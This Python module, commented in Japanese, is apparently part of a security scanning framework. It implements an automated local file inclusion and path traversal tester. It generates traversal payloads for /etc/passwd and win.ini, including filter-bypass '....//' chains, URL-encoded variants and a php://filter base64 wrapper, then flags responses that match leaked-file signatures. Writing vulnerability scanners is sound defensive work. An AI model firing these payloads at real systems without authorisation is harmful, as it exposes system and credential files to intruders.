"""
Smart LFI Tester - AI駆動型LFI/パストラバーサルテスター

このモジュールは、ターゲット環境（OS、言語、階層深さ）を自動推論し、
効率的にLFI/パストラバーサル脆弱性を検知します。
"""

import logging
import re
from typing import List, Dict, Optional, Any
from dataclasses import dataclass
from urllib.parse import urlparse

from src.core.infra.network_client import AsyncNetworkClient

logger = logging.getLogger(__name__)

@dataclass
class LFIResult:
    """LFI検出結果のデータモデル"""
    url: str
    parameter: str
    payload: str
    vulnerable: bool = False
    evidence: str = ""  # 漏洩したファイルの内容の一部
    response_code: int = 0
    severity: str = "high"
    detected_os: str = "unknown"
    injection_type: str = "lfi"  # lfi, traversal, php_wrapper etc.

class LFITester:
    """
    動的ペイロード生成とAIヒューリスティックを備えたLFIテスター
    """
    
    # 脆弱性判定用インジケーター（レスポンスに含まれていれば成功）
    INDICATORS = {
        "linux": [
            r"root:.*:0:0:",           # /etc/passwd
            r"bin:.*:1:1:",            # /etc/passwd
            r"daemon:.*:2:2:",         # /etc/passwd
            r"\[vsyscall\]",           # /proc/self/maps
        ],
        "windows": [
            r"\[fonts\]",              # win.ini
            r"\[extensions\]",         # win.ini
            r"\[mci extensions\]",     # win.ini
            r"Microsoft\s*Windows",    # system info
        ],
        "php": [
            r"<\?php",
            r"PD9waH",                 # Base64 encoded <?php (starts with )
        ]
    }

    def __init__(self, network_client: Optional[AsyncNetworkClient] = None):
        self.network_client = network_client or AsyncNetworkClient()
        self.results: List[LFIResult] = []

    def _calculate_traversal_depth(self, url: str) -> int:
        """URLのパス階層から必要な ../ の数を計算する"""
        parsed = urlparse(url)
        path = parsed.path.strip("/")
        if not path:
            return 3 # 最低限の深さ
        depth = path.count("/") + 1
        return max(depth, 3) # 少し余裕を持たせる

    def generate_smart_payloads(self, url: str, os_hint: str = "linux") -> List[Dict[str, str]]:
        """
        環境に合わせたスマートなペイロードセットを生成する
        """
        depth = self._calculate_traversal_depth(url)
        payloads = []
        
        # 1. Basic Traversal & Double Traversal (Bypass medium level filter)
        traversal = "../" * depth
        double_traversal = "....//" * depth
        
        if os_hint == "linux":
            payloads.append({"payload": f"{traversal}etc/passwd", "type": "basic"})
            payloads.append({"payload": f"{double_traversal}etc/passwd", "type": "double_traversal"})
            payloads.append({"payload": "/etc/passwd", "type": "absolute"}) # 絶対パス
        else:
            payloads.append({"payload": f"{traversal}windows/win.ini", "type": "basic"})
            win_double = "....\\\\" * depth
            payloads.append({"payload": f"{win_double}windows/win.ini", "type": "double_traversal"})
            payloads.append({"payload": "C:\\windows\\win.ini", "type": "absolute"})

        # 2. PHP Wrappers (PHP環境が疑われる場合)
        payloads.append({
            "payload": "php://filter/convert.base64-encode/resource=index", 
            "type": "php_wrapper"
        })

        # 3. Encoding Variants (Bypass用)
        payloads.append({
            "payload": f"{traversal.replace('/', '%2f')}etc/passwd" if os_hint == "linux" else f"{traversal.replace('/', '%2f')}windows/win.ini", 
            "type": "encoding"
        })

        return payloads

    async def test_parameter(
        self, 
        base_url: str, 
        parameter: str, 
        payload: str,
        method: str = "GET"
    ) -> Optional[LFIResult]:
        """特定のパラメータに対してペイロードを試行する"""
        
        # URL/Paramsの構築
        params = {}
        if method == "GET":
            params = {parameter: payload}
            
        try:
            response = await self.network_client.request(
                method=method,
                url=base_url,
                params=params if method == "GET" else None,
                data=params if method == "POST" else None,
                timeout=10
            )
            
            if response and response.status == 200:
                is_vulnerable, detected_os, evidence = self._analyze_response(response.text)
                
                if is_vulnerable:
                    result = LFIResult(
                        url=base_url,
                        parameter=parameter,
                        payload=payload,
                        vulnerable=True,
                        evidence=evidence,
                        response_code=response.status,
                        detected_os=detected_os
                    )
                    self.results.append(result)
                    return result
                    
        except Exception as e:
            logger.error(f"Error testing LFI payload: {e}")
            
        return None

    def _analyze_response(self, text: str) -> tuple[bool, str, str]:
        """レスポンス内容を解析してシグネチャを探す"""
        for os_name, patterns in self.INDICATORS.items():
            for pattern in patterns:
                match = re.search(pattern, text, re.IGNORECASE | re.MULTILINE)
                if match:
                    # 証拠としてマッチした行の前半を抽出
                    start = max(0, match.start() - 20)
                    end = min(len(text), match.end() + 50)
                    evidence = text[start:end].strip()
                    return True, os_name, f"Matched pattern: {pattern}\nSnippet: {evidence}"
        
        return False, "unknown", ""

    def get_summary_for_ai(self) -> str:
        vulns = [r for r in self.results if r.vulnerable]
        return f"LFI Analysis complete. Tested {len(self.results)} payloads. Found {len(vulns)} vulnerabilities."


def create_lfi_tester() -> LFITester:
    """LFITester作成ヘルパー (後方互換性)"""
    return LFITester()
